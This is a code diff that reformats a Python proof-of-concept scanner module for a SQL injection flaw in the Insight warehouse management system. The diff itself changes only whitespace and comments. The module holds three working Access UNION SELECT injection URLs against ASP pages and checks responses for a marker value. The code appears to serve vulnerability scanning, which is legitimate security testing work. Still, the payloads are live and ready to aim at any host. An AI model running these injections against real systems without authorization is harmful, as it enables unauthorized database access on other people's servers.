@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Insight_0013' # 平台漏洞编号，留空
+    vuln_id = 'Insight_0013'  # 平台漏洞编号，留空
     name = 'Insight仓储管理系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-08-01'  # 漏洞公布时间
     desc = '''
         Insight仓储管理系统
@@ -22,6 +23,7 @@ class Vuln(ABVuln):
     product = 'Insight(英赛特仓储管理系统)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'd8c0014d-9e75-4fa0-8496-947d2deaca0f'
     author = '47bwy'  # POC编写者
@@ -34,15 +36,18 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #http://www.wooyun.org/bugs/wooyun-2010-0129390
-            #http://www.wooyun.org/bugs/wooyun-2010-0129392
+
+            # http://www.wooyun.org/bugs/wooyun-2010-0129390
+            # http://www.wooyun.org/bugs/wooyun-2010-0129392
             hh = hackhttp.hackhttp()
-            #SQL注入 Access 注入
+            # SQL注入 Access 注入
             payloads = [
-                self.target + '/gjdcx/cxszbj.asp?cxid=-7201%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,Exp(1)%20FROM%20MSysAccessObjects%16',
-                self.target + '/gjdcx/ljszbj.asp?ljid=-7201%20UNION%20ALL%20SELECT%20NULL,%20NULL,%20NULL,%20NULL,Exp(1)%20FROM%20MSysAccessObjects%16',
-                self.target + '/gjdcx/yhglbj.asp?userid=-1000%20union%20select%20Exp(1),Exp(1),Exp(1),Exp(1)%20FROM%20MSysAccessObjects%16'
+                self.target +
+                '/gjdcx/cxszbj.asp?cxid=-7201%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,Exp(1)%20FROM%20MSysAccessObjects%16',
+                self.target +
+                '/gjdcx/ljszbj.asp?ljid=-7201%20UNION%20ALL%20SELECT%20NULL,%20NULL,%20NULL,%20NULL,Exp(1)%20FROM%20MSysAccessObjects%16',
+                self.target +
+                '/gjdcx/yhglbj.asp?userid=-1000%20union%20select%20Exp(1),Exp(1),Exp(1),Exp(1)%20FROM%20MSysAccessObjects%16'
             ]
             exp_1 = '2.71828182845905'
             for payload in payloads:
@@ -58,6 +63,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
